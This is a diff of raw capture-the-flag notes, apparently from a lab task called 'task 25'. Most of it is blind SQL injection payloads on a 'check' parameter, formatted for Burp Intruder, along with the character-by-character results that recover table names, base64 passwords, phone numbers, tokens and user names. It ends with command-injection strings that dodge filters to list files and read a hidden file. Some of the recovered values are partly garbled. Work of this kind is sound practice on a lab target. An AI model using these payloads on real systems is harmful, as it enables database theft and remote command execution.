@@ -1,0 +1,331 @@
+The warehouse allows only LOCAL admins
+task 25
+if(user === '8c6bb8f2903a4822d5fdc6b2edb61009' && passwd === 'c8f0962cebee6eafe4f6f742ded06785'){
+
+cdb{3asy_5t4rt_-_5ql_m45t3r__cmd_c0mpl1t3d}
+
+check=%2B12345678910' order by 1; -- -
+
+check=%2B12345678910' UNION SELECT 1,database(); -- -
+check=%2B12345678910' UNION SELECT 1,user(); -- -
+Статус заказа: under consideration
+
+check=%2B12345678910' or substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),§1§,1)='§a§'; -- -
+orders
+
+check=%2B12345678910' or substring((select column_name from information_schema.columns where table_name='orders' limit 0,1),§1§,1)='§a§'; -- -
+
+id (123)
+
+check=%2B12345678910' or substring((select column_name from information_schema.columns where table_name='orders' limit 1,1),§1§,1)='§a§'; -- -
+
+gid (123)
+
+descr
+
+
+check=%2B12345678910' or substring((select gid from orders limit 0,1),1,1)='§a§'; -- -
+only 1 and its not a letter
+
+
+check=%2B12345678910' or substring((select descr from orders limit 0,1),§1§,1)='§a§'; -- -
+
+under6c
+
+check=%2B12345678910' or substring((select descr from orders limit 1,1),§1§,1)='§a§'; -- -
+
+add4in7progress
+
+rejected
+
+check=%2B12345678910' or substring((select descr from orders limit 3,1),§1§,1)='§a§'; -- -
+
+check=%2B12345678910' or substring((select table_name from information_schema.tables where table_schema=database() limit 1,1),§1§,1)='§a§'; -- -
+
+passwords
+
+check=%2B12345678910' or substring((select column_name from information_schema.columns where table_name='passwords' limit 0,1),§1§,1)='§a§'; -- -
+
+id
+
+check=%2B12345678910' or substring((select column_name from information_schema.columns where table_name='passwords' limit 1,1),§1§,1)='§a§'; -- -
+gid
+
+base64_pw
+
+check=%2B12345678910' or substring((select base64_pw from passwords limit 0,1),§1§,1)='§a§'; -- -
+
+position 0
+id =1
+gid = 1
+1
+dgfzZgeYYXNKMW9PAJJO
+
+gid 2
+id =2
+password position 1
+
+c2framz1m2gybdj1ywrmbi4zazjs    2930  31
+26	26	z	200	false	false	13344	
+25	12	y	200	false	false	13344	
+
+55	9	m	200	false	false	13344	
+101	7	z	200	false	false	13344	
+110	8	1	200	false	false	13344	
+116	10	2	200	false	false	13344	
+
+52	24	z	200	false	false	13344	
+63	23	4	200	false	false	13344	
+
+69	18	w	200	false	false	13344	
+74	17	y	200	false	false	13344	
+82	16	1	200	false	false	13344	
+
+20	25	a	200	false	false	13344	
+33	13	b	200	false	false	13344	
+41	21	b	200	false	false	13344	
+84	14	d	200	false	false	13344	
+156	11	g	200	false	false	13344	
+217	22	i	200	false	false	13344	
+235	15	j	200	false	false	13344	
+247	27	j	200	false	false	13344	
+326	6	m	200	false	false	13344	
+329	9	m	200	false	false	13344	
+340	20	m	200	false	false	13344	
+439	19	r	200	false	false	13344	
+	
+23	3	F		
+69	4	R	
+107	2	2	
+150	5	a	
+156	1	c	
+
+	
+
+3
+id = 3
+gid = 3
+password position 2
+YxnKA24xmmHLmTI4AGRWodkxodjozde7bgthc2rt 41
+
+14	38	2	200	false	false	13344	
+81	33	b	200	false	false	13344	
+93	37	c	200	false	false	13344	
+122	34	g	200	false	false	13344	
+132	36	h	200	false	false	13344	
+215	39	r	200	false	false	13344	
+227	35	t	200	false	false	13344	
+232	40	t	200	false	false	13344		
+
+4	16	4	200	false	false	13344	
+
+49	32	7	200	false	false	13344	
+85	26	d	200	false	false	13344	
+89	30	d	200	false	false	13344	
+97	31	e	200	false	false	13344	
+128	27	j	200	false	false	13344	
+150	28	o	200	false	false	13344	
+242	29	z	200	false	false	13344	
+256	29	Z	200	false	false	13344	
+
+62	22	d	200	false	false	13344	
+98	23	k	200	false	false	13344	
+106	21	o	200	false	false	13344	
+110	25	o	200	false	false	13344	
+164	24	x	200	false	false	13344	
+
+5	5	A	200	false	false	13344	
+86	11	H	200	false	false	13344	
+109	4	K	200	false	false	13344	
+132	12	L	200	false	false	13344	
+209	14	T	200	false	false	13344	
+211	1	Y	200	false	false	13344	
+255	15	I	200	false	false	13344	
+306	6	2	200	false	false	13344	
+337	7	4	200	false	false	13344	
+425	5	a	200	false	false	13344	
+536	11	h	200	false	false	13344	
+555	15	i	200	false	false	13344	
+574	4	k	200	false	false	13344	
+597	12	l	200	false	false	13344	
+624	9	m	200	false	false	13344	
+625	10	m	200	false	false	13344	
+628	13	m	200	false	false	13344	
+633	3	n	200	false	false	13344	
+719	14	t	200	false	false	13344	
+767	2	x	200	false	false	13344	
+773	8	x	200	false	false	13344	
+781	1	y	200	false	false	13344	
+
+gid = 4
+id = 4
+password position 3
+
+d3V1dXQ/eW91VHJ5SGFja1VzIT8/IQ==++
+d3V1dXQ/eW91VHJ5SGFja1VzIT8/IQ==
+wuuut?youTryHackUs!??!
+
+470	33	+	200	false	false	13344	
+471	34	+	200	false	false	13344	
+
+435	31	=	200	false	false	13344	
+436	32	=	200	false	false	13344	
+443	28	/	200	false	false	13344	
+
+79	27	8	200	false	false	13344	
+191	29	i	200	false	false	13344	
+280	30	q	200	false	false	13344	
+309	26	t	200	false	false	13344	
+393	33		200	false	false	13344	
+
+7	22	1	200	false	false	13344	
+41	16	5	200	false	false	13344	
+96	21	a	200	false	false	13344	
+144	19	f	200	false	false	13344	
+153	18	g	200	false	false	13344	
+180	25	i	200	false	false	13344	
+185	20	j	200	false	false	13344	
+272	17	s	200	false	false	13344	
+308	23	v	200	false	false	13344	
+349	24	z	200	false	false	13344	
+369	24	Z	200	false	false	13344	
+
+41	8	/	200	false	false	13344	
+331	1	D	200	false	false	13344	
+35	5	D	200	false	false	13344	
+89	14	H	200	false	false	13344	
+105	15	J	200	false	false	13344	
+142	7	Q	200	false	false	13344	
+160	10	W	200	false	false	13344	
+174	9	E	200	false	false	13344	
+289	4	1	200	false	false	13344	
+297	12	1	200	false	false	13344	
+317	2	3	200	false	false	13344	
+416	11	9	200	false	false	13344	
+466	1	d	200	false	false	13344	
+470	5	d	200	false	false	13344	
+489	9	e	200	false	false	13344	
+539	14	h	200	false	false	13344	
+570	15	j	200	false	false	13344	
+667	7	q	200	false	false	13344	
+738	3	v	200	false	false	13344	
+748	13	v	200	false	false	13344	
+760	10	w	200	false	false	13344	
+771	6	x	200	false	false	13344	
+846	6	X	200	false	false	13344	
+873	3	V	200	false	false	13344	
+883	13	V	200	false	false	13344	
+
+
+dgfzZgeYYXNKMW9PAJJO
+
+c2framz1m2gybdj1ywrmbi4zazjs
+
+YxnKA24xmmHLmTI4AGRWodkxodjozde7bgthc2rt
+
+D3v1DxQ/EW91vHJ5Sgfja1vzit8/iq==++
+
+6?(7!=<9)&!
+
+check=%2B12345678910' or substring((select table_name from information_schema.tables where table_schema=database() limit 2,1),§1§,1)='§a§'; -- -
+
+phones 	
+
+id
+phone
+
+phone 0
++123456789
+	
+phone 1
++987654321
+
+phones 2
++79998882211	
+
+phones 3,4 net
+
+check=%2B12345678910' or substring((select table_name from information_schema.tables where table_schema=database() limit 3,1),§1§,1)='§a§'; -- -
+
+tokens 
+	
+token
+
+token 0
+-_5ql_m45t3r_
+
+115	5	l	200	false	false	13344	
+137	7	m	200	false	false	13344	
+164	4	q	200	false	false	13344	
+200	10	t	200	false	false	13344	
+3284	8	4	200	false	false	13344	
+333	3	5	200	false	false	13344	
+339	9	5	200	false	false	13344	
+422	2	_	200	false	false	13344	
+426	6	_	m200	false	false	13344
+172	12	r	200	false	false	13344	
+311	11	3	200	false	false	13344	
+423	13	_	200	false	false	13344	
+
+token 1,2,3,4 net
+
+check=%2B12345678910' or substring((select table_name from information_schema.tables where table_schema=database() limit 4,1),§1§,1)='§a§'; -- -
+
+users 
+
+0
+id
+1
+user
+2
+user
+3
+current_connections
+4
+total_connections	
+
+0 user 
+admintrash
+	
+1 user 
+admin_trash
+	
+2 user 
+rootnotadmin
+
+3 user
+admin
+
+0 current_connections
+1 current_connections
+2 current_connections
+3 current_connections
+
+
+0 total_connections
+1 total_connections
+2 total_connections
+3 total_connections
+
+src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="
+
+http://10.8.32.1:42794/82b8a831e18b5e105bd5928e89e21032/img/item-03.jpg
+
+check=%2B12345678910' or ASCII(substring((select base64_pw from passwords limit 3,1),30,1))=ASCII('Q'); --
+
+https://www.base64decode.org/
+
+
+query=§aaa§&exec=Execute
+home/nina/PayloadsAllTheThings/Command Injection/Intruder/command-execution-unix.txt
+
+
+grep works via browser:
+
+grep -rnF '..' -e '}'
+%0Agrep -rnF '.' -e ''
+
+works only via burp, not browser:
+
+searchTxt=%0Al$()s -a&search=Search
+searchTxt=%0Ac$()at .df9d409df27e64f904b1fb9fe4ee5424&search=Search
